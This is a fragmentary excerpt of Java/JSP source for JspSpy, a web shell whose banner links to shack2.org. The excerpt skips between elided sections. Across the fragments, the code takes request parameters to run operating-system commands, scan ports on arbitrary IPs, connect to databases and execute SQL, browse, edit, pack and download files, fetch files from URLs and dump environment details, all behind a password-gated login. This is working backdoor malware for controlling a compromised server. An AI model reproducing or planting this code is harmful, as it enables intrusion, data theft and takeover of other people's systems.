...
try {
	...
	return new String(str.getBytes(REQUEST_CHARSET),PAGE_CHARSET);
	}
}catch (Exception e) {
	return null;
	}
...
return Double.parseDouble(format.format(value).toString());
}
...
String o = StringParse.parse(request.getParameter("o"));
if (o != null &&  o.equals("login")) {
((LoginInvoker)ins.get("login")).invoke(request,response,session);
return;
} else if (o != null && o.equals("vLogin")) {
((VLoginInvoker)ins.get("vLogin")).invoke(request,response,session);
return;
} else {
...
"<p><pre>");
try{
out.println("this method is closed...");
}catch (Exception ex) {
...
try {
PrintWriter out = response.getWriter();
String ip = StringParse.parse(request.getParameter("ip"));
String ports = StringParse.parse(request.getParameter("ports"));
String timeout = StringParse.parse(request.getParameter("timeout"));
if (Util.isEmpty(ip))
ip = "127.0.0.1";
...
try {
PrintWriter out = response.getWriter();
((VPortScanInvoker)ins.get("vPortScan")).invoke(request,response,JSession);
String ip = StringParse.parse(request.getParameter("ip"));
String ports = StringParse.parse(request.getParameter("ports"));
String timeout = StringParse.parse(request.getParameter("timeout"));
int iTimeout = 0;
...
try {
Socket s = new Socket();
s.connect(new InetSocketAddress(ip,Integer.parseInt(portArr[i])),iTimeout);
s.close();
rs.put(portArr[i],"Open");
} catch (Exception e) {
rs.put(portArr[i],"Close");
}
}
out.println("<div style='margin:10px'>");
Iterator iter=rs.keySet().iterator();
while(iter.hasNext()){
String port = iter.next().toString();
String value = rs.get(port).toString();
...
((DbcInvoker)ins.get("dbc")).invoke(request,response,JSession);
}
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
try {
PrintWriter out = response.getWriter();
String driver = StringParse.parse(request.getParameter("driver"));
String url = StringParse.parse(request.getParameter("url"));
String uid = StringParse.parse(request.getParameter("uid"));
String pwd = StringParse.parse(request.getParameter("pwd"));
String sql = StringParse.parse(request.getParameter("sql"));
String selectDb = StringParse.parse(request.getParameter("selectDb"));
if (selectDb == null)
...
PrintWriter out = response.getWriter();
String sql = StringParse.parse(request.getParameter("sql"));
String db = StringParse.parse(request.getParameter("selectDb"));
Object dbo = JSession.getAttribute(DBO);
if (!Util.isEmpty(sql)) {
if (dbo == null || !((DBOperator)dbo).isValid()) {
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String inputPw = StringParse.parse(request.getParameter("pw"));
...
try {
PrintWriter out = response.getWriter();
String path = StringParse.parse(request.getParameter("folder"));
if (Util.isEmpty(path)){path = JSession.getAttribute(CURRENT_DIR).toString();}
...
out.println("<h2>File Manager - Current disk &quot;"+(cr.indexOf("/") == 0?"/":currentRoot.getPath())+"</h2>");
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String src = StringParse.parse(request.getParameter("src"));
String to = StringParse.parse(request.getParameter("to"));
...
try {
PrintWriter out = response.getWriter();
String path = StringParse.parse(request.getParameter("filepath"));
...
PrintWriter out = response.getWriter();
String path = StringParse.parse(request.getParameter("filepath"));
String content = StringParse.parse(request.getParameter("filecontent"));
...
try {
PrintWriter out = response.getWriter();
String filepath = StringParse.parse(request.getParameter("filepath"));
...
"<p>Current file (fullpath)<br /><input class=\"input\" name=\"file\" id=\"file\" value=\""+StringParse.parse(request.getParameter("filepath"))+"\" type=\"text\" size=\"120\"  /></p>"+
...
try {
PrintWriter out = response.getWriter();
String cmd = StringParse.parse(request.getParameter("command"));
String program = StringParse.parse(request.getParameter("program"));
...
try {
PrintWriter out = response.getWriter();
String type = StringParse.parse(request.getParameter("type"));
if (type.equals("command")) {
((VsInvoker)ins.get("vs")).invoke(request,response,JSession);
out.println("<div style='margin:10px'><hr/>");
out.println("<pre>");
String command = StringParse.parse(request.getParameter("command"));
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String downFileUrl = StringParse.parse(request.getParameter("url"));
String savePath = StringParse.parse(request.getParameter("savepath"));
...
((VdInvoker)ins.get("vd")).invoke(request,response,JSession);
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
((FileListInvoker)ins.get("filelist")).invoke(request,response,JSession);
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
...
PrintWriter out = response.getWriter();
String src = StringParse.parse(request.getParameter("src"));
String target  = StringParse.parse(request.getParameter("to"));
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String dir = StringParse.parse(request.getParameter("dir"));
...
if (Util.isEmpty(files))
return;
String saveFileName = StringParse.parse(request.getParameter("savefilename"));
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String packedFile = StringParse.parse(request.getParameter("packedfile"));
...
try {
String savepath = StringParse.parse(request.getParameter("savepath"));
String zipfile = StringParse.parse(request.getParameter("zipfile"));
...
((VmpInvoker)ins.get("vmp")).invoke(request,response,JSession);
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
...
envs.add("sun.boot.library.path");
envs.add("java.util.logging.config.file");
envs.add("user.dir");
envs.add("os.name");
envs.add("catalina.home");
envs.add("file.encoding");
envs.add("java.home");
envs.add("java.version");
for (int i=0;i<envs.size();i++) {
	String key=envs.get(i)+"";
out.println("<li><u>"+key+" : </u>"+Util.htmlEncode(System.getenv(key))+"</li>");
}
...
"	<tr class=\"head\">"+
"		<td><span style=\"float:right;\"><a href=\"http://www.shack2.org\" target=\"_blank\">JspSpy Ver: jdk1.4专用版 jdk版本："+jdkver+"</a></span>"+request.getHeader("host")+" ("+InetAddress.getLocalHost().getHostAddress()+")</td>"+
"	</tr>"+
"	<tr class=\"alt1\">"+
...
String cmd = StringParse.parse(request.getParameter("cmd"));
if (Util.isEmpty(cmd))
return;
if (o == null)
return;
...
((BeforeInvoker)ins.get("before")).invoke(request,response,session);
((ScriptInvoker)ins.get("script")).invoke(request,response,session);
((TopInvoker)ins.get("top")).invoke(request,response,session);
}
in.invoke(request,response,session);
if (!in.doAfter()) {
return;
}else{
((BottomInvoker)ins.get("bottom")).invoke(request,response,session);
((AfterInvoker)ins.get("after")).invoke(request,response,session);
}
}
} else {
response.sendRedirect(SHELL_NAME+"?o=index");
...
Util.outMsg(out,Util.htmlEncode(new String(bout.toByteArray())),"left");
